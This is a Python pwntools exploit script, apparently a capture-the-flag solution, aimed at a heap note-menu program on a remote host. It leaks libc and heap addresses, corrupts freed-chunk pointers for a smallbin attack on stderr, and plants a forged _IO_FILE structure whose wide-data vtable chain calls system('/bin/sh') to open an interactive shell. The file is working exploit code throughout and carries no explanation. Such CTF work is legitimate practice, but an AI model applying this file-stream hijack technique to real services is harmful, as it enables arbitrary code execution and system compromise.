#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import*

context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'new-window'])
def debug(cmd=''):
	cmd += "b main\n"
	gdb.attach(p, cmd)
	pause()

host = "43.156.14.141"
port = 1151
#p = process("./pwn")
p = remote(host, port)

def add(idx, size, content):
	p.sendlineafter("choice: ", "1")
	p.sendlineafter("index:\n", str(idx).encode())
	p.sendlineafter("size:\n", str(size).encode())
	p.sendafter("content:\n", content)
def view(idx):
	p.sendlineafter("choice: ", "2")
	p.sendlineafter("index:\n", str(idx).encode())	
def edit(idx, size, content):
	p.sendlineafter("choice: ", "3")
	p.sendlineafter("index:\n", str(idx).encode())
	p.sendlineafter("size:\n", str(size).encode())
	p.sendafter("content:\n", content)	
def delet(idx):
	p.sendlineafter("choice: ", "4")
	p.sendlineafter("index:\n", str(idx).encode())
def quit(size, content):
	p.sendlineafter("choice: ", "5")
	p.sendlineafter("size:\n", str(size).encode())
	p.sendafter("content:\n", content)

for i in range(5):
	add(i, 0x180, "aaaa")
for i in range(11):
	add(i+5, 0x3f0, "aaaa")
for i in range(13):
	delet(i)

delet(14)
#show libc&heap
view(12)
libc_base =u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x219ce0
log.success("libc_base: {}".format(hex(libc_base)))
stderr = libc_base + 0x21a6a0
sys = libc_base + 0x50d60
p.recvn(2)
chunk_base =u64(p.recvn(8)) - 0x2e60
log.success("chunk_base: {}".format(hex(chunk_base)))
# debug()

add(16, 0x260, "devider")
add(17, 0x260, "devider")
add(18, 0x260, "chunk 12 into smallbin")

payload = ""
payload = payload.ljust(0x260, "\x00")
payload +=p64(0) + p64(0x191) + p64(chunk_base+0x30d0) + p64(stderr-0x10)
edit(12, 0x3f0, payload)

add(19, 0x180, "deadbeef")

# debug()

fake_io_addr=stderr # 伪造的fake_IO结构体的地址
next_chain = 0
fake_IO_FILE = "/bin/sh\x00"         #_flags=rdi
fake_IO_FILE+=p64(0)*4+p64(0xfffffffff)+p64(0)*2
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
fake_IO_FILE +=p64(sys)#_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(chunk_base+0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(libc_base+0x2160c0+0x30)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
fake_IO_FILE = fake_IO_FILE.ljust(0x180, "\x00")

#debug()
quit(0x180, fake_IO_FILE)




p.interactive()
